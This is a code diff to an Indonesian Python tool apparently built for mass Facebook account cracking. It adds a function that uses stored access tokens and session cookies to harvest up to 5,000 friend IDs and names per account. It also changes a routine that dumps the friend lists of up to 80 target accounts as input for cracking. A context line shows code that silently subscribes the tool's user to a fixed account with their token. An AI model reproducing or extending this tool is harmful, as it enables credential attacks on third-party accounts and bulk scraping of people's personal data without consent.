@@ -950,6 +950,37 @@ def bot_follow():
 		toket = open('.fantoken.txt','r').read()
 		r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={toket}')
 
+
+def temankuini(cookie, token):
+    try:
+        headers = {
+            "connection": "keep-alive",
+            "accept": "*/*",
+            "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
+            "accept-encoding": "gzip, deflate",
+            "accept-language": "id-ID,id;q=0.9"
+        }
+        params = {
+            "access_token": token,
+            "fields": "friends.limit(5000){id,name}"  # Maksimal 5000 teman
+        }
+        url = f"https://graph.facebook.com/me"
+        while url:
+            response = requests.get(url, params=params, headers=headers, cookies=cookie).json()
+            friends = response.get("friends", {}).get("data", [])
+            for friend in friends:
+                temanku.append(f"{friend['id']}|{friend['name']}")
+            # Cek apakah masih ada halaman selanjutnya
+            paging = response.get("friends", {}).get("paging", {}).get("next")
+            if paging:
+                url = paging  # Lanjut ke halaman berikutnya
+                params = {}  # Kosongkan params agar tidak bertabrakan
+            else:
+                break  # Berhenti jika tidak ada halaman lagi
+    except Exception as e:
+        print(f"Error: {e}")
+
+
 # ----------------[ BAGIAN-MENU ]----------------#
 def menu():
     try:
@@ -975,12 +1006,9 @@ def menu():
         my_name=[]
         my_id=[]
     try:
-        link = ses.get(f"https://graph.facebook.com/me?fields=id,name,friends.limit(5000)&access_token={token}", cookies={"cookie": cookie}).json()
-        if "friends" in link:
-            for c in link["friends"]["data"]:
-                temanku.append(c["id"] + " | " + c["name"])
-        else:
-            console.print(f" {H2}• {P2}Pertemanan tidak publik atau tidak ada teman yang bisa diambil.")
+        cookie = {"cookie": open(".fancookie.txt", "r").read()}
+        token = open(".fantoken.txt", "r").read()
+        temankuini(cookie,token)
     except Exception as e:
         console.print(f" {H2}• {P2}Gagal mengambil data teman: {str(e)}")
     os.system("clear")
@@ -1046,8 +1074,10 @@ def dump_publikk(idfac,fields,cookie,token):
         dump_publikk(idfac,url["friends"]["paging"]["cursors"]["after"],cookie,token)
     except: pass
 
+
 #----------[ CRACK-massal  ]----------#
 def massal():
+    global id
     try:
         token = open(".fantoken.txt", "r").read().strip()
         cok = open(".fancookie.txt", "r").read().strip()
@@ -1064,12 +1094,13 @@ def massal():
         Console().print(f" {H2}• {P2}Jumlah target tidak valid (1-80)")
         exit()
     ses = requests.Session()
+
     uid = []  # Menyimpan daftar target
     id = []   # Menyimpan hasil dump
     # Input ID Target
     for i in range(jum):
         Console().print(Panel(f"[bold white] Masukkan Target ke-{i+1}", width=60, style=color_panel))
-        kl = input(f" {H2}• {P2}Masukkan ID Target: ")
+        kl = Console().input(f" {H2}• {P2}Masukkan ID Target: ")
         uid.append(kl)
     # Loop untuk setiap target
     for userr in uid:
@@ -1089,16 +1120,17 @@ def massal():
                     url = ses.get(f"https://graph.facebook.com/{userr}", params=params, headers=headers, cookies={"cookie": cok}).json()
                     for i in url["friends"]["data"]:
                         id.append(i["id"] + "|" + i["name"])
-                        sys.stdout.write(f"\r • Sedang dump ID : {len(id)}")
+                        sys.stdout.write(f"\r • sedang dump id, berhasil mendapatkan : {len(id)} ID")
                         sys.stdout.flush()
             else:
-                pass
+                Console().print(f" {H2}• {P2}Pertemanan tidak dapat diakses untuk ID {userr}")
         except (KeyError, IOError):
             Console().print(f" {H2}• {P2}Pertemanan tidak dapat diakses untuk ID {userr}")
         except requests.exceptions.ConnectionError:
             Console().print(f" {H2}• {P2}Koneksi tidak stabil!")
             exit()
     try:
+        print('\n')
         setting()
     except requests.exceptions.ConnectionError:
         Console().print(f" {H2}• {P2}Koneksi tidak stabil!")
